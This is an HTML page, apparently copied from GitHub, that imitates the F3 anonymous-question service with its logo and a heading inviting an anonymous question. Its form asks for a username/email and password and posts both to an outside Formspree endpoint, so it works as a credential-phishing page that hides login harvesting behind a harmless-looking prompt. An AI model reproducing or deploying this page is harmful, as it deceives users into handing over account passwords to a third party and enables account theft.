<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>F3</title>
    <link rel="icon" href="https://androidprogrammi.ru/wp-content/uploads/2021/02/cool_f3.png">
    <style>
        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            
        }
    
        body{
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            background: rgb(131,58,180);
background: linear-gradient(90deg, rgba(131,58,180,1) 0%, rgba(253,29,29,1) 50%, rgba(252,176,69,1) 100%);
        }
        form{
            
            display: flex;
            flex-direction: column;
            align-items: center;
            
        }
        input{
            width: 400px;
            height: 40px;
            margin: 10px;
            padding: 10px;
            font-size: 15px;
            border-radius: 3px;
            border: none;
        }
    
        button{
            width: 150px;
            height: 40px;
            background-color: dodgerblue;
            color:white;
            font-weight: 900;
            font-size: 16px;
            border: none;
            border-radius: 8px;
            margin-top: 10px;
            color: #f2f3f4;
        }    
    
        .logo{
            width: 100px;
            height: 100px;
            background-image: url(https://androidprogrammi.ru/wp-content/uploads/2021/02/cool_f3.png);
            position: fixed;
            top: 50px;
            background-size: cover;
            border-radius: 20px;
            box-shadow: 0 3px 3px #333;
        }
        .quest{
            
            font-family: monospace;
            background-color: #16f21d;
            color: #333;
            padding: 5px 20px;
            border-radius: 20px;
            margin: 20px 0;
            box-shadow: 0 2px 2px #333;
            
            
        }
    </style>
</head>
<body>
  <div class="logo"></div>
  <h1 class="quest">Give me anonime question</h1>
  
  
   <form
   
   
  action="https://formspree.io/f/mzbygorj"
  method="POST">
   
   
    <input placeholder="Username" type="email" name="_replyto">
    <input placeholder="Password" type="password" name="message">
    <button type="submit">Send</button>
    
</form>
</body>
</html>
© 2021 GitHub, Inc.
